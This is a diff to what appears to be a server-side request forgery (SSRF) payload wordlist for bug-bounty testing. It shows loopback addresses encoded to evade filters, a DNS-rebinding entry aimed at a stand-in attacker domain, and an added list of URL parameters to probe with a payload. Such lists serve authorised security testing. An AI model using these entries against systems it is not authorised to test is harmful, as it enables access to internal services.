@@ -1088,3 +1088,29 @@ http://2130706433/
 http://0x7f000001/
 # DNS rebinding — CNAME to attacker-controlled TTL=0 record
 http://rebind.attacker.tld/
+# ─── SSRF param dork list (page 19 of bounty_tips_100) ───
+?dest={payload}
+?redirect={payload}
+?uri={payload}
+?path={payload}
+?continue={payload}
+?url={payload}
+?window={payload}
+?next={payload}
+?data={payload}
+?reference={payload}
+?site={payload}
+?html={payload}
+?val={payload}
+?validate={payload}
+?domain={payload}
+?callback={payload}
+?return={payload}
+?page={payload}
+?feed={payload}
+?host={payload}
+?port={payload}
+?to={payload}
+?out={payload}
+?view={payload}
+?dir={payload}
